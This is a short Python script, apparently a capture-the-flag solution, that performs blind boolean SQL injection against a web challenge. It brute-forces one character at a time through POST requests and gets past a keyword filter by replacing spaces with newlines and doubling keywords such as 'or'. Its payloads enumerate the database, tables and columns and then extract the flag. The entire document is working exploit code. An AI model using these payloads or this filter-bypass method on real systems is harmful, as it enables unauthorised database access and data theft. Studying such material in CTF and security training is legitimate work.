#! usr/bin/env python    
# coding:utf-8    
import requests
import string

url = 'http://ctf5.shiyanbar.com/web/earnest/index.php'
s = requests.session()

ascil = string.printable
def exploit(payload):
    payload = payload.replace(' ',chr(0x0a))
    flag = ''
    for i in range(1,32):
        for j in ascil:
            temp = j
            data = {'id':payload.format(i,temp)}
            html = s.post(url,data=data)
            # print data
            if "You are in" in html.content:
                flag += j
                print flag
                break


# exploit("0'oorr(mid(database()from({})foorr(1))='{}')oorr'0")
# exploit("0'oorr((select(mid(group_concat(table_name)from({})foorr(1)))from(infoorrmation_schema.tables)where(table_schema)=database())='{}')oorr'0")
# exploit("0'oorr((select(mid(group_concat(column_name)from({})foorr(1)))from(infoorrmation_schema.columns)where(table_name)='fiag')='{}')oorr'0")
exploit("0'oorr((select(mid((fl$4g)from({})foorr(1)))from(fiag))='{}')oorr'0")